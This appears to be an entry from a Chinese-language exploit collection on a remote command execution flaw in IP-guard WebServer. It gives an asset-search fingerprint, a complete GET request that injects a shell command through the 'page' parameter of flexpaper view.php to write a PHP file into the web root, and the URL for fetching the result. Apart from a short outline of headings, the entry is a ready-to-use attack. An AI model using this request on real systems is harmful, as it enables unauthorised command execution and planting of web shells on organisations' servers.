# IP-guardWebServer远程命令执行漏洞

- **系统**：IP-guardWebServer　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`web.icon=="210a3c89d4ab5effa18d6dd7a9627376"`
- **请求**：`GET /ipg/static/appr/lib/flexpaper/php/view.php?doc=1.jpg&format=swf&isSplit=true&page=echo+^<?php+phpinfo();+?^>+>2.php HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: ipg_session=uiki60dds9f9jop2jpj0vn8h22aa3e1o`

**请求体 / payload**
```

获取命令执行结果
/ipg/static/appr/lib/flexpaper/php/2.php
```

**其他**
- IP-guard WebServer 远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * IP-guard